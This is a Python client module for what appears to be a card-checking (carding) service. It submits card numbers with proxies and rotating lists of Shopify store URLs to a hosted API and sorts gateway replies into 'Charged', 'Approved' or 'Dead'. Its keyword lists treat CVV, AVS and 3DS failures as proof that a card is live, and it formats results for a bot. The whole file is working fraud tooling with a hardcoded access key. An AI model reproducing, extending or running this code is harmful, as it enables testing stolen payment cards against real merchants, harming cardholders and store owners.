"""
Shopify API Manager — Stateless Edition (v4.2.0)

Matches the stateless `api.py` contract:
  - Every /shopify call MUST forward the bot's own `fallback_sites` list.
  - No /sync-sites. No pool-pushing. No pool_size in /health.
  - Retries another replica only when a replica reports "sites exhausted"
    (per-replica blacklist/throttle state differs, so a retry can help).
  - NO_SITES (400) from any replica is returned immediately — it's a
    client config error, retrying another replica won't help.

CHANGES vs v3:
  - push_sites_to_all_replicas() is now a no-op stub (deprecation).
  - auto_health_check() no longer requires pool_size > 0.
  - _is_pool_exhausted() only matches "sites exhausted" now.
  - 400 responses are surfaced immediately with proper classification.
"""

import asyncio
import aiohttp
import logging
import random
import time
import urllib.parse
from typing import Optional, Dict, Any, List

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HOSTED API SERVERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_SERVERS = [
    "shopi-production-8424.up.railway.app",
]

SHOPIFY_API_KEY = "oozaruhshop"
ALT_API_KEY     = "oozaruhshop"

ACTIVE_API_SERVERS: List[str] = API_SERVERS.copy()
SERVER_HEALTH: Dict[str, dict] = {}

# Cap forwarded fallback list to keep URLs safe (proxies / HTTP servers
# default to 4-8KB line limits). 20 sites × ~30 chars = ~600 bytes.
FALLBACK_SITES_CAP = 20

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SERVER SELECTOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_active_server() -> str:
    pool = ACTIVE_API_SERVERS if ACTIVE_API_SERVERS else API_SERVERS
    return random.choice(pool)

def get_active_servers_excluding(seen: set) -> List[str]:
    remaining = [s for s in ACTIVE_API_SERVERS if s not in seen]
    if not remaining:
        remaining = [s for s in API_SERVERS if s not in seen]
    return remaining or list(API_SERVERS)

def format_proxy(proxy: Optional[str]) -> Optional[str]:
    if not proxy:
        return None
    p = proxy.strip()
    if p.startswith("http://") or p.startswith("https://"):
        parsed = urllib.parse.urlparse(p)
        if parsed.username and parsed.password:
            return f"{parsed.hostname}:{parsed.port}:{parsed.username}:{parsed.password}"
        return f"{parsed.hostname}:{parsed.port}"
    return p

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GATE RESPONSE CLASSIFIER (unchanged)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def classify_gate_response(response_msg: str, raw_dict: Optional[dict] = None, gateway: str = "") -> dict:
    if raw_dict is None:
        raw_dict = {}

    charged_flag = (str(raw_dict.get('Charged', '')).lower() == 'true'
                    or str(raw_dict.get('charged', '')).lower() == 'true')
    approved_flag = (str(raw_dict.get('Approved', '')).lower() == 'true'
                     or str(raw_dict.get('approved', '')).lower() == 'true')

    if charged_flag:
        return {'status': 'Charged', 'retry': False}
    if approved_flag:
        return {'status': 'Approved', 'retry': False}

    msg = str(response_msg or "").strip()
    msg_upper = msg.upper()

    CHARGED_KEYWORDS = [
        'ORDER_PLACED', 'PAYMENT_COMPLETE', 'SUBMITSUCCESS', 'ORDER_CREATED',
        'PROCESSEDRECEIPT', 'PAYMENT SUCCESSFUL', 'SUCCEEDED', 'AUTHORISED',
        'PAYMENT ACCEPTED', 'THANK YOU FOR YOUR ORDER', 'THANK YOU', 'CHARGED',
        'SALE', 'RECEIPT', 'RECEIPT_ID', 'CONFIRMATION_NUMBER', 'ORDER_CONFIRMED',
        'TRANSACTION_COMPLETED', 'ORDER_STATUS_URL', 'ORDER_SUCCESS'
    ]
    if any(k in msg_upper for k in CHARGED_KEYWORDS):
        return {'status': 'Charged', 'retry': False}

    INSUFFICIENT_FUNDS_KEYWORDS = [
        'INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS', 'NOT_ENOUGH_BALANCE',
        'NOT ENOUGH BALANCE', 'LOW_BALANCE', '140'
    ]
    CVV_MISMATCH_KEYWORDS = [
        'INVALID_CVC', 'INCORRECT_CVC', 'CVC_DECLINED', 'CVV MISMATCH', 'CVV_MISMATCH',
        'SECURITY CODE', 'SECURITY_CODE', 'CVC CHECK FAILED', 'CVC_CHECK', 'INVALID_CVV',
        '103', '144'
    ]
    THREEDS_KEYWORDS = [
        '3DS_REQUIRED', '3D_SECURE', '3DS', 'AUTHENTICATION_REQUIRED',
        'ACTION_REQUIRED', 'REDIRECTSHOPPER', 'CHALLENGESHOPPER',
        'IDENTIFYSHOPPER', 'PRESENTTOSHOPPER', '128'
    ]
    AVS_MISMATCH_KEYWORDS = [
        'INCORRECT_ZIP', 'ZIP_MISMATCH', 'AVS_FAILED', 'BILLING_ADDRESS_MISMATCH',
        'ADDRESS VERIFICATION FAILED', 'POSTAL_CODE_MISMATCH'
    ]
    APPROVED_KEYWORDS = [
        'APPROVED', 'APPROVE_WITH_ID', 'SUCCESS', 'ZERO AUTH', 'LIVE', 'CCN LIVE',
        'CARD_TESTING'
    ]

    if any(k in msg_upper for k in INSUFFICIENT_FUNDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in CVV_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in THREEDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in AVS_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if (any(k in msg_upper for k in APPROVED_KEYWORDS)
            and not any(k in msg_upper for k in
                        ['NOT APPROVED', 'UNAPPROVED', 'DECLINED'])):
        return {'status': 'Approved', 'retry': False}

    SITE_ERROR_KEYWORDS = [
        'NO_PRODUCT', 'THROTTLED', 'TIMEOUT', 'TOKENIZATION_FAILED',
        'SITE_REQUIRES_LOGIN', 'CART_FAILED', 'CHECKOUT_FAILED',
        'NEGOTIATE_FAILED', 'GRAPHQL_ERROR', 'SESSION_EXPIRED',
        'NO_SESSION_TOKEN', 'NO_ATTEMPT_TOKEN', 'NO_SELLER_PROPOSAL',
        'CHECKPOINTDENIED', 'NO_SHOPIFY_PAYMENTS_GATEWAY', 'SUBMIT_FAILED',
        'ORDER_CREATION_FAILED', 'NO_PAYMENT_REQUIRED', 'PROXY ERROR',
        'CONNECTION REFUSED', 'HOST UNREACHABLE', 'INTERNAL_SERVER_ERROR',
        'GATEWAY_TIMEOUT', 'BAD_GATEWAY', 'CLOUDFLARE_BLOCKED',
        'MERCHANT_ACCOUNT_CLOSED', 'GATEWAY_NOT_CONFIGURED',
        'SITE DEAD', 'INVALID SITE', 'CAPTCHA_REQUIRED', 'NOT_SUPPORTED',
        'FAILED TO GET TOKEN', 'SITE ERROR', 'NO_SITES'
    ]
    if any(k in msg_upper for k in SITE_ERROR_KEYWORDS):
        return {'status': 'Site Error', 'retry': True}

    return {'status': 'Dead', 'retry': False}


def _is_pool_exhausted(data: dict) -> bool:
    """
    True only when the API's auto-validate ran through every supplied site
    and none produced a card-level answer. In that case, a different replica
    (with its own blacklist state) might succeed on the SAME sites.
    """
    code = str(data.get("Response", "")).upper()
    msg = str(data.get("Message", "") or data.get("message", "")).lower()
    if code not in ("SITE_ERROR", ""):
        return False
    # Match only _auto_validate's exhaustion string
    return "sites exhausted" in msg

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLIENT ENDPOINTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def check_shopify_card(
    site: str,
    cc: str,
    proxy: Optional[str] = None,
    session: Optional[aiohttp.ClientSession] = None,
    max_retries: int = 3,
    timeout_sec: float = 40.0,
    fallback_sites: Optional[List[str]] = None,
    attempts: int = 15,
    auto: bool = False,
) -> dict:
    if not site.startswith("http"):
        site = f"https://{site}"

    proxy_str = format_proxy(proxy)
    close_session = False
    if session is None:
        client_timeout = aiohttp.ClientTimeout(total=timeout_sec)
        session = aiohttp.ClientSession(timeout=client_timeout)
        close_session = True

    # Cap + dedupe fallback list
    fallback_str: Optional[str] = None
    if fallback_sites:
        seen: set[str] = set()
        cleaned: list[str] = []
        for s in fallback_sites:
            if not s:
                continue
            ss = s.strip()
            if not ss:
                continue
            if not ss.startswith("http"):
                ss = f"https://{ss}"
            if ss in seen:
                continue
            seen.add(ss)
            cleaned.append(ss)
            if len(cleaned) >= FALLBACK_SITES_CAP:
                break
        if cleaned:
            fallback_str = ",".join(cleaned)

    try:
        tested_servers: set = set()
        last_error: Optional[str] = None

        for attempt in range(max_retries):
            candidates = get_active_servers_excluding(tested_servers)
            if not candidates:
                candidates = list(API_SERVERS)
            server = random.choice(candidates)
            tested_servers.add(server)

            params = {
                "site":     site,
                "cc":       cc,
                "key":      SHOPIFY_API_KEY,
                "attempts": str(attempts),
            }
            if proxy_str:
                params["proxy"] = proxy_str
            if auto:
                params["auto"] = "true"
            if fallback_str:
                params["fallback_sites"] = fallback_str

            url = f"{server}/shopify?{urllib.parse.urlencode(params)}"

            try:
                async with session.get(url, timeout=timeout_sec) as resp:
                    # ── 200 OK ──
                    if resp.status == 200:
                        data = await resp.json()

                        if _is_pool_exhausted(data):
                            last_error = str(data.get("Message", "sites exhausted"))
                            logging.info(
                                "[shopify_api] replica %s exhausted client sites (%s) — "
                                "trying a different replica (attempt %d/%d)",
                                server, last_error, attempt + 1, max_retries,
                            )
                            if attempt < max_retries - 1:
                                await asyncio.sleep(0.15)
                                continue
                            resp_msg = str(data.get("Response", "SITE_ERROR"))
                            gateway = data.get("Gate",
                                               data.get("Gateway", "Shopify Payments"))
                            data["Classification"] = classify_gate_response(
                                resp_msg, data, gateway
                            )
                            data["Status"] = False
                            return data

                        resp_msg = data.get("Response",
                                            data.get("card_response", "Unknown"))
                        gateway = data.get("Gate",
                                           data.get("Gateway", "Shopify Payments"))
                        data["Classification"] = classify_gate_response(
                            resp_msg, data, gateway
                        )
                        data["Status"] = data["Classification"]["status"] in (
                            "Charged", "Approved"
                        )
                        return data

                    # ── 401/403: try ALT key once ──
                    elif resp.status in (401, 403):
                        alt_params = dict(params)
                        alt_params["key"] = ALT_API_KEY
                        alt_url = f"{server}/shopify?{urllib.parse.urlencode(alt_params)}"
                        try:
                            async with session.get(alt_url, timeout=timeout_sec) as alt_resp:
                                if alt_resp.status == 200:
                                    data = await alt_resp.json()
                                    if _is_pool_exhausted(data):
                                        last_error = str(data.get("Message",
                                                                  "sites exhausted"))
                                        if attempt < max_retries - 1:
                                            await asyncio.sleep(0.15)
                                            continue
                                    resp_msg = data.get("Response",
                                                        data.get("card_response",
                                                                 "Unknown"))
                                    gateway = data.get("Gate",
                                                       data.get("Gateway",
                                                                "Shopify Payments"))
                                    data["Classification"] = classify_gate_response(
                                        resp_msg, data, gateway
                                    )
                                    data["Status"] = data["Classification"]["status"] in (
                                        "Charged", "Approved"
                                    )
                                    return data
                        except Exception as e:
                            last_error = f"alt-key: {e}"
                            logging.warning(
                                "[shopify_api] alt-key fetch failed on %s: %s",
                                server, e,
                            )

                    # ── 400: client error, retrying won't help ──
                    elif resp.status == 400:
                        try:
                            data = await resp.json()
                        except Exception:
                            data = {
                                "Response": "BAD_REQUEST",
                                "Message":  f"HTTP 400 from {server}",
                            }
                        code = str(data.get("Response", "")).upper()
                        if code == "NO_SITES":
                            logging.warning(
                                "[shopify_api] %s returned NO_SITES — "
                                "bot must pass fallback_sites when auto=True",
                                server,
                            )
                        else:
                            logging.warning(
                                "[shopify_api] %s returned 400 (%s) — "
                                "client error, not retrying",
                                server, data.get("Message", ""),
                            )
                        data["Classification"] = {"status": "Site Error",
                                                   "retry": False}
                        data["Status"] = False
                        return data

                    # ── other status ──
                    else:
                        last_error = f"HTTP {resp.status}"
                        logging.warning(
                            "[shopify_api] %s returned HTTP %s (attempt %d/%d)",
                            server, resp.status, attempt + 1, max_retries,
                        )

            except Exception as e:
                last_error = f"{type(e).__name__}: {e}"
                logging.warning(
                    "[shopify_api] attempt %d/%d on %s failed: %s",
                    attempt + 1, max_retries, server, e,
                )
                await asyncio.sleep(0.3)

        return {
            "Response":       "API_REPLICAS_UNREACHABLE",
            "Message":        last_error or "All replicas failed",
            "CC":             cc,
            "Price":          "0.00",
            "Gate":           "Shopify Payments",
            "Site":           site,
            "Charged":        "False",
            "Approved":       "False",
            "Time":           "0s",
            "Status":         False,
            "Classification": {"status": "Site Error", "retry": True},
        }
    finally:
        if close_session:
            await session.close()


async def check_site(
    site: str,
    card: Optional[str] = None,
    proxy: Optional[str] = None,
    session: Optional[aiohttp.ClientSession] = None,
    timeout_sec: float = 20.0,
) -> dict:
    if not site.startswith("http"):
        site = f"https://{site}"

    proxy_str = format_proxy(proxy)
    close_session = False
    if session is None:
        client_timeout = aiohttp.ClientTimeout(total=timeout_sec)
        session = aiohttp.ClientSession(timeout=client_timeout)
        close_session = True

    try:
        server = get_active_server()
        params = {"site": site, "key": SHOPIFY_API_KEY}
        if card:
            params["card"] = card
        if proxy_str:
            params["proxy"] = proxy_str

        url = f"{server}/check?{urllib.parse.urlencode(params)}"
        try:
            async with session.get(url, timeout=timeout_sec) as resp:
                if resp.status == 200:
                    return await resp.json()
        except Exception:
            pass

        for alt_server in API_SERVERS:
            if alt_server == server:
                continue
            alt_params = {"site": site, "key": SHOPIFY_API_KEY}
            if card:
                alt_params["card"] = card
            if proxy_str:
                alt_params["proxy"] = proxy_str
            try:
                async with session.get(
                    f"{alt_server}/check?{urllib.parse.urlencode(alt_params)}",
                    timeout=timeout_sec,
                ) as resp:
                    if resp.status == 200:
                        return await resp.json()
            except Exception:
                continue

        return {
            "valid":  False,
            "site":   site,
            "reason": "CHECK_FAILED",
            "detail": "All replicas unreachable",
        }
    finally:
        if close_session:
            await session.close()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DEPRECATED — kept as no-op so main.py doesn't break
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def push_sites_to_all_replicas(sites: List[str]) -> Dict[str, Any]:
    """
    DEPRECATED: The API is now stateless. Sites are supplied per-request
    via `fallback_sites`. This function is a no-op stub so existing callers
    (main.py's sync loop) don't break.

    Remove the call from main.py at your convenience; nothing will change.
    """
    logging.warning(
        "[shopify_api] push_sites_to_all_replicas() is deprecated — "
        "the API is stateless and receives sites per-request. "
        "Remove the call from main.py."
    )
    return {
        "deprecated": True,
        "pushed":     0,
        "results":    {},
        "note":       "API is stateless — pass fallback_sites on every "
                      "check_shopify_card call",
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND HEALTH CHECK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def auto_health_check():
    logging.info("[shopify_api] auto_health_check started for %d API servers.",
                 len(API_SERVERS))
    while True:
        try:
            active: List[str] = []
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                for api in API_SERVERS:
                    t0 = time.time()
                    try:
                        async with session.get(f"{api}/health") as resp:
                            elapsed = round(time.time() - t0, 3)
                            if resp.status != 200:
                                SERVER_HEALTH[api] = {
                                    "status":     f"HTTP {resp.status}",
                                    "latency":    f"{elapsed}s",
                                    "last_check": time.time(),
                                }
                                continue

                            data = await resp.json()
                            if str(data.get("status", "")).lower() != "ok":
                                SERVER_HEALTH[api] = {
                                    "status":     data.get("status", "unknown"),
                                    "latency":    f"{elapsed}s",
                                    "last_check": time.time(),
                                }
                                continue

                            active.append(api)
                            SERVER_HEALTH[api] = {
                                "status":            "online",
                                "version":           data.get("version", "?"),
                                "mode":              data.get("mode", "?"),
                                "latency":           f"{elapsed}s",
                                "keys_configured":   data.get("keys_configured", 0),
                                "site_concurrency":  data.get("site_concurrency", 0),
                                "blacklisted_sites": data.get("blacklisted_sites", 0),
                                "throttled_sites":   data.get("throttled_sites", 0),
                                "last_check":        time.time(),
                            }
                    except Exception as e:
                        SERVER_HEALTH[api] = {
                            "status":     f"offline ({type(e).__name__})",
                            "latency":    "-",
                            "last_check": time.time(),
                        }

            if active:
                ACTIVE_API_SERVERS.clear()
                ACTIVE_API_SERVERS.extend(active)
                logging.debug(
                    "[shopify_api] health: %d/%d replicas active",
                    len(active), len(API_SERVERS),
                )
            else:
                logging.warning(
                    "[shopify_api] no healthy replicas — keeping previous "
                    "active list (%d)",
                    len(ACTIVE_API_SERVERS),
                )
        except Exception as e:
            logging.error("[shopify_api] health check loop exception: %s", e)

        await asyncio.sleep(60)

def get_health_summary() -> str:
    lines = [
        "<b>⚡ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗔𝗣𝗜 𝗖𝗹𝘂𝘀𝘁𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀</b>",
        "━━━━━━━━━━━━━━━━━━━━━",
    ]
    for idx, s in enumerate(API_SERVERS, 1):
        info = SERVER_HEALTH.get(s, {})
        status     = info.get("status", "unknown")
        latency    = info.get("latency", "-")
        version    = info.get("version", "?")
        mode       = info.get("mode", "?")
        blacklisted = info.get("blacklisted_sites", 0)
        throttled  = info.get("throttled_sites", 0)

        domain = urllib.parse.urlparse(s).netloc.split(".")[0]
        icon = "🟢" if status == "online" else "🔴"

        lines.append(f"{icon} <b>Replica {idx}</b> (<code>{domain}</code>)")
        lines.append(f"  ├ Status: <code>{status}</code>")
        lines.append(f"  ├ Version: <code>{version}</code> ({mode})")
        lines.append(f"  ├ Blacklisted: <code>{blacklisted}</code> · "
                     f"Throttled: <code>{throttled}</code>")
        lines.append(f"  └ Latency: <code>{latency}</code>")

    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <b>Active Replicas:</b> "
                 f"{len(ACTIVE_API_SERVERS)}/{len(API_SERVERS)}")
    return "\n".join(lines)
